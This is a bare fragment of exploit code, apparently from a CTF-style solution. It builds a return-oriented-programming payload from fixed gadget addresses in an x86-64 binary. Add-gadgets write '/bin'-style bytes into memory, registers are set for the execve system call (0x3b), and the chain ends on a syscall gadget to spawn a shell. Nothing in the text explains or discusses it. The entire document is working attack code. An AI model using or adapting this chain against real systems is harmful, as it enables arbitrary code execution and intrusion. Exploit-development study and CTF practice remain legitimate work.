payload = p64(0x401f85)
#0x0000000000401f85: pop rbx; pop rbp; ret; 
payload += p64(0x80)+p64(0x4081bf)+p64(0x40125c)
# 0x40125c: add dword ptr [rbp - 0x3d], ebx ; nop ; ret
payload += p64(0x401f85)
# 0x0000000000401f85: pop rbx; pop rbp; ret; 
payload += p64(0x6e69622f)+p64(0x4080ad)+p64(0x40125c)
# 0x40125c: add dword ptr [rbp - 0x3d], ebx ; nop ; ret
payload += p64(0x401f85)
# 0x0000000000401f85: pop rbx; pop rbp; ret; 
payload += p64(0x68662f)+p64(0x4080b1)+p64(0x40125c)
# 0x40125c: add dword ptr [rbp - 0x3d], ebx ; nop ; ret
payload += p64(0x4017d3)
# 0x00000000004017d3: pop rdi; ret; 
payload += p64(0x408070)+p64(0x4023c8)
# 0x00000000004023c8: pop rsi; pop rbp; ret; 
payload += p64(0x36b07f97)+p64(0x0)+p64(0x402470)
# 0x0000000000402470: mov eax, esi; pop rbx; pop r14; pop rbp; ret; 
payload += p64(0x0)+p64(0x0)+p64(0x0)+p64(0x401553)
# 0x0000000000401553: add edx, dword ptr [rax - 0x366ffe15]; ret; 
payload += p64(0x4023c8)
# 0x00000000004023c8: pop rsi; pop rbp; ret; 
payload += p64(0x3b)+p64(0x0)+p64(0x402470)
# 0x0000000000402470: mov eax, esi; pop rbx; pop r14; pop rbp; ret; 
payload += p64(0x0)+p64(0x0)+p64(0x0)+p64(0x4023c8)
# 0x00000000004023c8: pop rsi; pop rbp; ret; 
payload += p64(0x0)+p64(0x0)+p64(0x402bc0)
# 0x0000000000402bc0: syscall; 
payload += b''
